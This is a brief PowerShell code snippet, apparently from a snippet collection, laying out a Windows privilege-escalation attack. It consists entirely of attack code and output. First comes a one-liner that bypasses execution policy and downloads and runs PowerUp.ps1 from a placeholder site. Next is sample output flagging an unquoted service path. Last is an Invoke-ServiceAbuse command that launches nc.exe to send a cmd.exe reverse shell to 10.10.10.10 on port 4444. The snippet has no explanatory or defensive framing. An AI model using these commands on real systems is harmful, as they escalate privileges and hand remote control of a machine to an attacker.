---
id: c037b4de-13be-4a53-8f2e-5180421f36d5
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:29.682661+00:00'
updated_at: '2023-04-10T20:37:34.121438+00:00'
---

# Code Snippet c037b4de

**Language**: Powershell

```powershell
# Find the vulnerable application
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

...
[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
...

# Automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```
